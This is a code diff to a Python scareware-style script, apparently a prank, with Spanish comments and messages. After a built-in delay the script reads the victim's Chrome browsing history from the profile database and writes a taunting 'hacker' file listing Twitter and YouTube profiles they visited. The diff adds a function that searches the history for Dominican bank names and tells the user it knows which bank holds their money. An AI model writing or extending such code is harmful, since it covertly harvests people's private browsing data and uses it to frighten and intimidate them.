@@ -21,7 +21,7 @@ def get_chrome_history():
     urls = None
     while not urls:
         try:
-            history_path = os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Default/History'
+            history_path = os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Profile 1/History'
             con = sqlite3.connect(history_path)
             cursor = con.cursor()
             cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
@@ -68,6 +68,18 @@ def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
     hacker_file.write(f"\nTambien he visto que has visitado los canales de YouTube de {', '.join(profiles_visited)}, "
                       f"ajaaaa.....")
 
+def check_bank_account(hackage_file,chrome_history):
+    his_bank = None
+    banks = ["Banreservas", "BHD", "Popular"]
+    for item in chrome_history:
+        for b in banks:
+            if b.lower() in item[0].lower():
+                his_bank = b
+                break
+        if his_bank:
+            break
+    hackage_file.write(f"\nAdemas veo que guardas tu dinero en el banco {his_bank}, ta fichao!!!")
+
 def main():
     #Esperamos algunas horas para que se ejecute el script
     delay_action()
@@ -82,6 +94,7 @@ def main():
     chrome_history = get_chrome_history()
     check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
     check_youtube_profiles_and_scare_user(hacker_file,chrome_history)
+    check_bank_account(hacker_file, chrome_history)
 
 if __name__ == "__main__":
     main()
